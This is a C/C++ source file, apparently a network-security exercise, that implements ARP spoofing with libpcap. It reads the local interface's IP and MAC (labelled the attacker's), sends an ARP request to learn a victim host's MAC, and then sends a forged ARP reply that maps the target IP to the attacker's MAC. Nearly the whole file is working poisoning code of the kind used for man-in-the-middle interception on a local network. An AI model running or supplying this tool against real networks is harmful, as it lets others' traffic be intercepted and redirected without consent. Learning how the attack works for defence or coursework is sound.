#include "send-arp.h"
// #include "ethhdr.h"
// #include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

uint32_t parse_ip(char* addr) {
    unsigned int a, b, c, d;
    int res = sscanf(addr, "%u.%u.%u.%u", &a, &b, &c, &d);
	if (res != 4) {
		fprintf(stderr, "Ip scan error!return %d r=%s\n", res, addr);
		return -1;
	}
	return (a << 24) | (b << 16) | (c << 8) | d;
}

void get_attacker_ip(char* ipaddr,  char* dev) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	struct sockaddr_in* sin;

    if (sock < 0) {
        fprintf(stderr, "Socket() error!\n");
        return;
    }

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(sock, SIOCGIFADDR, &ifr);

	sin = (struct sockaddr_in*)&ifr.ifr_addr;

    strcpy(ipaddr, inet_ntoa(sin->sin_addr));
    
	close(sock);
}

void get_attacker_mac(char* macaddr, char* dev) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;

    if (sock < 0) {
        fprintf(stderr, "Socket() error!\n");
        return;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    for (int i = 0; i < 6; i++)
        sprintf(&macaddr[i*3],"%02x:",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
    macaddr[17]='\0';
    close(sock);   
}

void check_sender_mac(char* senderip, char* sendermac, char* attip, char* attmac, pcap_t* handle) {
    EthArpPacket sendpkt;

    // Set the request header.
    sendpkt.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	sendpkt.eth_.smac_ = Mac(attmac);
	sendpkt.eth_.type_ = htons(EthHdr::Arp);

	sendpkt.arp_.hrd_ = htons(ArpHdr::ETHER);
	sendpkt.arp_.pro_ = htons(EthHdr::Ip4);
	sendpkt.arp_.hln_ = Mac::SIZE;
	sendpkt.arp_.pln_ = Ip::SIZE;
	sendpkt.arp_.op_ = htons(ArpHdr::Request);
	sendpkt.arp_.smac_ = Mac(attmac);
	sendpkt.arp_.sip_ = htonl(Ip(attip));
	sendpkt.arp_.tmac_ = Mac("00:00:00:00:00:00");
	sendpkt.arp_.tip_ = htonl(Ip(senderip));

    // Send ARP packet to sender to get sender's MAC address.
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&sendpkt), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "Send ARP packet error!\n");
	}

    // Get reply ARP packet.
    while(1) {
        struct pcap_pkthdr* header;
        const u_char* rcv_packet;
        int res = pcap_next_ex(handle, &header, &rcv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return error! %d(%s).\n", res, pcap_geterr(handle));
            break;
        }
        else {
            if(((uint8_t)rcv_packet[12] == 0x08) && ((uint8_t)rcv_packet[13] == 0x06)){ // type : ARP
                for (int i = 0; i < 6; i++)
                    sprintf(&sendermac[i*3],"%02x:",((unsigned char*)rcv_packet)[6+i]);
                sendermac[17]='\0';
                printf("%s\n", sendermac);
                break;
			} 
		}        
    }
}

void send_arp_reply(char* senderip, char* sendermac, char* targip, char* attmac, pcap_t* handle)
{
    EthArpPacket sendpkt;
    // Set the request header.
    sendpkt.eth_.dmac_ = Mac(sendermac);
	sendpkt.eth_.smac_ = Mac(attmac);
	sendpkt.eth_.type_ = htons(EthHdr::Arp);

	sendpkt.arp_.hrd_ = htons(ArpHdr::ETHER);
	sendpkt.arp_.pro_ = htons(EthHdr::Ip4);
	sendpkt.arp_.hln_ = Mac::SIZE;
	sendpkt.arp_.pln_ = Ip::SIZE;
	sendpkt.arp_.op_ = htons(ArpHdr::Reply);
	sendpkt.arp_.smac_ = Mac(attmac);
	sendpkt.arp_.sip_ = htonl(Ip(targip));
	sendpkt.arp_.tmac_ = Mac(sendermac);
	sendpkt.arp_.tip_ = htonl(Ip(senderip));

    // Send despiteful ARP reply packet to victim.
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&sendpkt), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "Send ARP packet error!\n");
	}
}